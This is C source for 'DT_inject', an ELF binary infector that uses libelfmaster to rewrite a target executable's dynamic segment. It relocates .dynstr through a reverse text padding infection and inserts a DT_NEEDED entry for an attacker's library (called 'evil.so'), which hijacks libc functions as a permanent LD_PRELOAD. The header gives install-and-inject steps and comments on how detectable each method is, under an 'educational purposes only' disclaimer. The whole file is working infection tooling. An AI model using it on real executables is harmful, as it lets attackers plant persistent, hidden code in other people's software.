/*
 * DT_inject - Shared library injector using DT_NEEDED infection
 *
 * DT_NEEDED infector: Shifts DT_NEEDED entries forward and creates one that
 * takes precedence over others. This acts as a sort of static LD_PRELOAD i.e.
 * if you create you create a function called void puts(const char *s) in your
 * injected library, it will hijack the puts() function from libc.so by taking
 * precedence in the dynamic linkers order of resolution. If for some rare
 * occurrence there is not enough padding space after .dynamic to create any
 * extra dynamic segment entries, it will overwrite DT_DEBUG with DT_NEEDED
 * (Which is a bit easier to detect) Disclaimer: For educational purposes only.
 * I, Ryan O'Neill, take no responsibility for what this software is used for.

 * git clone https://github.com/elfmaster/libelfmaster
 * cd libelfmaster; make; sudo make install
 * cd <dir_where_inject.c_is>
 * make
 * sudo cp <some_evil_lib>.so /lib/x86_64/
 * ./inject <some_evil_lib>.so <executable>
 * readelf -d <executable> to observe the DT_NEEDED entry
 *
 * Author: Elfmaster - 2/13/19
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <elf.h>
#include <link.h>
#include <stdbool.h>
#include <unistd.h>

#include "/opt/elfmaster/include/libelfmaster.h"

#define PAGE_ALIGN_UP(x) ((x + 4095) & ~4095)

#define PT_PHDR_INDEX 0
#define PT_INTERP_INDEX 1

#define TMP "xyz.tmp"

bool dt_debug_method = false;
bool calculate_new_dynentry_count(elfobj_t *, uint64_t *, uint64_t *);

/*
 * arg1: target elf object
 * arg2: string name, i.e. "evil.so"
 * arg3: address of .dynstr (Which is now in a different location)
 * arg4: offset of "evil.so" within .dynstr
 */
bool
modify_dynamic_segment(elfobj_t *target, uint64_t dynstr_vaddr,
    uint64_t evil_offset)
{
	bool use_debug_entry = false;
	bool res;
	uint64_t dcount, dpadsz, index;
	uint64_t o_dcount = 0, d_index = 0, dt_debug_index = 0;
	elf_dynamic_entry_t d_entry;
	elf_dynamic_iterator_t d_iter;
	elf_error_t error;
	struct tmp_dtags {
		bool needed;
		uint64_t value;
		uint64_t tag;
		TAILQ_ENTRY(tmp_dtags) _linkage;
	};
	struct tmp_dtags *current;
	TAILQ_HEAD(, tmp_dtags) dtags_list;
	TAILQ_INIT(&dtags_list);

	if (calculate_new_dynentry_count(target, &dcount, &dpadsz) == false) {
		fprintf(stderr, "Failed to calculate padding size after dynamic section\n");
		return false;
	}
	if (dcount == 0) {
		fprintf(stderr, "Not enough room to shift dynamic entries forward"
		    ", falling back to overwriting DT_DEBUG with DT_NEEDED\n");
		use_debug_entry = true;
	} else if (dt_debug_method == true) {
		fprintf(stderr, "Forcing DT_DEBUG overwrite. This technique will not give\n"
		    "your injected shared library functions precedence over any other libraries\n"
		    "and will therefore require you to manually overwrite the .got.plt entries to\n"
		    "point at your custom shared library function(s)\n");
		use_debug_entry = true;
	}
	elf_dynamic_iterator_init(target, &d_iter);
	for (;;) {
		res = elf_dynamic_iterator_next(&d_iter, &d_entry);
		if (res == ELF_ITER_DONE)
			break;
		if (res == ELF_ITER_ERROR) {
			fprintf(stderr, "elf_dynamic_iterator_next failed\n");
			return false;
		}
		struct tmp_dtags *n = malloc(sizeof(*n));

		if (n == NULL) {
			perror("malloc");
			return false;
		}
		n->value = d_entry.value;
		n->tag = d_entry.tag;
		if (n->tag == DT_DEBUG)	{
			dt_debug_index = d_index;
		}
		TAILQ_INSERT_TAIL(&dtags_list, n, _linkage);
		d_index++;
	}

	/*
	 * In the following code we modify dynamic segment to look like this:
	 * Original: DT_NEEDED: "libc.so", DT_INIT: 0x4009f0, etc.
	 * Modified: DT_NEEDED: "evil.so", DT_NEEDED: "libc.so", DT_INIT: 0x4009f0, etc.
	 * Which acts like a permanent LD_PRELOAD.
	 * ...
	 * If there is no room to shift the dynamic entriess forward (Which there in
	 * general is enough space to add atleast several) then we fall back on a less
	 * elegant and easier to detect method where we overwrite DT_DEBUG and change
	 * it to a DT_NEEDED entry. This is easier to detect because of the fact that
	 * the linker always creates DT_NEEDED entries so that they are contiguous
	 * whereas in this case the DT_DEBUG that we overwrite is generally about 11
	 * entries after the last DT_NEEDED entry.
	 */

	index = 0;
	if (use_debug_entry == false) {
		d_entry.tag = DT_NEEDED;
		d_entry.value = evil_offset; /* Offset into .dynstr for "evil.so" */
		res = elf_dynamic_modify(target, 0, &d_entry, true, &error);
		if (res == false) {
			fprintf(stderr, "elf_dynamic_modify failed: %s\n",
			    elf_error_msg(&error));
			return false;
		}
		index = 1;
	}

	TAILQ_FOREACH(current, &dtags_list, _linkage) {
		if (use_debug_entry == true && current->tag == DT_DEBUG) {
			if (dt_debug_index == 0) {
				printf("Could not find DT_DEBUG entry, injection has failed\n");
				return false;
			}
			printf("%sOverwriting DT_DEBUG at index: %zu\n",
			    dcount == 0 ? "Falling back to " : "", dt_debug_index);
			d_entry.tag = DT_NEEDED;
			d_entry.value = evil_offset;
			res = elf_dynamic_modify(target, dt_debug_index, &d_entry, true, &error);
			if (res == false) {
				fprintf(stderr, "elf_dynamic_modify failed: %s\n",
				    elf_error_msg(&error));
				return false;
			}
			goto next;
		}
		if (current->tag == DT_STRTAB) {
			d_entry.tag = DT_STRTAB;
			d_entry.value = dynstr_vaddr;
			res = elf_dynamic_modify(target, index, &d_entry, true, &error);
			if (res == false) {
				fprintf(stderr, "elf_dynamic_modify failed: %s\n",
				   elf_error_msg(&error));
			 	return false;
			}
			printf("Modified d_entry.value of DT_STRTAB to: %lx (index: %zu)\n",
			    d_entry.value, index);
			goto next;
		}
#if 0
		printf("Updating dyn[%zu]\n", index);
#endif
		d_entry.tag = current->tag;
		d_entry.value = current->value;
		res = elf_dynamic_modify(target, index, &d_entry, true, &error);
		if (res == false) {
			fprintf(stderr, "elf_dynamic_modify failed: %s\n",
			    elf_error_msg(&error));
			return false;
		}
next:
		index++;
	}
	return true;
}

/*
 * This function will tell us how many new ElfN_Dyn entries
 * can be added to the dynamic segment, as there is often space
 * between .dynamic and the section following it.
 */
bool
calculate_new_dynentry_count(elfobj_t *target, uint64_t *count, uint64_t *size)
{
	elf_section_iterator_t s_iter;
	struct elf_section section;
	size_t len;
	size_t dynsz = elf_class(target) == elfclass32 ? sizeof(Elf32_Dyn) :
	    sizeof(Elf64_Dyn);
	uint64_t dyn_offset = 0;

	*count = 0;
	*size = 0;

	elf_section_iterator_init(target, &s_iter);
	while (elf_section_iterator_next(&s_iter, &section) == ELF_ITER_OK) {
		if (strcmp(section.name, ".dynamic") == 0) {
			dyn_offset = section.offset;
		} else if (dyn_offset > 0) {
			len = section.offset - dyn_offset;
			*size = len;
			*count = len / dynsz;
			return true;
		}
	}
	return false;
}

int main(int argc, char **argv)
{
	uint8_t *mem;
	elfobj_t so_obj;
	elfobj_t target;
	bool res, text_found = false;
	elf_segment_iterator_t p_iter;
	struct elf_segment segment;
	struct elf_section section, dynstr_shdr;
	elf_section_iterator_t s_iter;
	size_t paddingSize, o_dynstr_size, dynstr_size, ehdr_size, final_len;
	uint64_t old_base, new_base, n_dynstr_vaddr, evil_string_offset;
	elf_error_t error;
	char *evil_lib, *executable;
	int fd;
	ssize_t b;

	if (argc < 3) {
		printf("Usage: %s [-f] <lib.so> <target>\n", argv[0]);
		printf("-f	Force DT_DEBUG overwrite technique\n");
		exit(0);
	}
	if (argv[1][0] == '-' && argv[1][1] == 'f') {
		dt_debug_method = true;
		evil_lib = argv[2];
		executable = argv[3];
	} else {
		evil_lib = argv[1];
		executable = argv[2];
	}
	res = elf_open_object(executable, &target,
	    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error);
	if (res == false) {
		fprintf(stderr, "failed to open %s: %s\n", executable, elf_error_msg(&error));
		exit(-1);
	}
	ehdr_size = elf_class(&target) == elfclass32 ?
	    sizeof(Elf32_Ehdr) : sizeof(Elf64_Ehdr);

	res = elf_section_by_name(&target, ".dynstr", &dynstr_shdr);
	if (res == false) {
		perror("failed to find section .dynstr\n");
		exit(-1);
	}
	paddingSize = PAGE_ALIGN_UP(dynstr_shdr.size);

	res = elf_segment_by_index(&target, PT_PHDR_INDEX, &segment);
	if (res == false) {
		fprintf(stderr, "Failed to find segment: %d\n", PT_PHDR_INDEX);
		goto done;
	}
	segment.offset += paddingSize;
	res = elf_segment_modify(&target, PT_PHDR_INDEX, &segment, &error);
	if (res == false) {
		fprintf(stderr, "elf_segment_modify failed: %s\n", elf_error_msg(&error));
		goto done;
	}
	res = elf_segment_by_index(&target, PT_INTERP_INDEX, &segment);
	if (res == false) {
		printf("Failed to find segment: %d\n", PT_INTERP_INDEX);
		goto done;
	}
	segment.offset += paddingSize;
	res = elf_segment_modify(&target, PT_INTERP_INDEX, &segment, &error);
	if (res == false) {
		printf("elf_segment_modify failed: %s\n", elf_error_msg(&error));
		goto done;
	}
	printf("Creating reverse text padding infection to store new .dynstr section\n");
	elf_segment_iterator_init(&target, &p_iter);
	while (elf_segment_iterator_next(&p_iter, &segment) == ELF_ITER_OK) {
		if (text_found == true) {
			segment.offset += paddingSize;
			res = elf_segment_modify(&target, p_iter.index - 1,
			    &segment, &error);
			if (res == false) {
				printf("elf_segment_modify failed: %s\n",
				    elf_error_msg(&error));
				goto done;
			}
		}
		if (segment.type == PT_LOAD && segment.offset == 0) {
			old_base = segment.vaddr;
			segment.vaddr -= paddingSize;
			segment.paddr -= paddingSize;
			segment.filesz += paddingSize;
			segment.memsz += paddingSize;
			new_base = segment.vaddr;
			text_found = true;
			res = elf_segment_modify(&target, p_iter.index - 1,
			    &segment, &error);
			if (res == false) {
				printf("elf_segment_modify failed: %s\n",
				    elf_error_msg(&error));
				goto done;
			}
		}
	}
	/* Adjust .dynstr so that it points to where the reverse
	 * text extension is; right after elf_hdr and right before
	 * the shifted forward phdr table.
	 * Adjust all other section offsets by paddingSize to shift
	 * forward beyond the injection site.
	 */
	elf_section_iterator_init(&target, &s_iter);
	while(elf_section_iterator_next(&s_iter, &section) == ELF_ITER_OK) {
		if (strcmp(section.name, ".dynstr") == 0) {
			printf("Updating .dynstr section\n");
			section.offset = ehdr_size;
			section.address = old_base - paddingSize;
			section.address += ehdr_size;
			n_dynstr_vaddr = section.address;
			evil_string_offset = section.size;
			o_dynstr_size = section.size;
			section.size += strlen(evil_lib) + 1;
			dynstr_size = section.size;
			res = elf_section_modify(&target, s_iter.index - 1,
			    &section, &error);
		} else {
			section.offset += paddingSize;
			res = elf_section_modify(&target, s_iter.index - 1,
			    &section, &error);
		}
	}
	elf_section_commit(&target);
	if (elf_class(&target) == elfclass32) {
		target.ehdr32->e_shoff += paddingSize;
		target.ehdr32->e_phoff += paddingSize;
	} else {
		target.ehdr64->e_shoff += paddingSize;
		target.ehdr64->e_phoff += paddingSize;
	}
	res = modify_dynamic_segment(&target, n_dynstr_vaddr, evil_string_offset);
	if (res == false) {
		fprintf(stderr, "modify_dynamic_segment failed\n");
		exit(EXIT_FAILURE);
	}
	/*
	 * Write out our new executable with new string table.
	 */
	fd = open(TMP, O_CREAT|O_WRONLY|O_TRUNC, S_IRWXU);
	if (fd < 0) {
		perror("open");
		exit(EXIT_FAILURE);
	}
	/*
	 * Write initial ELF file header
	 */
	b = write(fd, target.mem, ehdr_size);
	if (b < 0) {
		perror("write");
		exit(EXIT_FAILURE);
	}
	/*
	 * Write out our new .dynstr section into our padding space
	 */
	b = write(fd, elf_dynstr(&target), o_dynstr_size);
	if (b < 0) {
		perror("write");
		exit(EXIT_FAILURE);
	}
	b = write(fd, evil_lib, strlen(evil_lib) + 1);
	if (b < 0) {
		perror("write");
		exit(EXIT_FAILURE);
	}

	if ((b = lseek(fd, ehdr_size + paddingSize, SEEK_SET)) != ehdr_size + paddingSize) {
		perror("lseek");
		exit(EXIT_FAILURE);
	}
	mem = target.mem + ehdr_size;
	final_len = target.size - ehdr_size;
	b = write(fd, mem, final_len);
	if (b != final_len) {
		perror("write");
		exit(EXIT_FAILURE);
	}
done:
	elf_close_object(&target);
	rename(TMP, executable);
	printf("Successfully injected '%s' into target: '%s'. Make sure to move '%s'"
	    " into one of the shared object search paths, i.e. /lib/x86_64-gnu-linux/\n",
	    evil_lib, executable, evil_lib);
	exit(EXIT_SUCCESS);
}
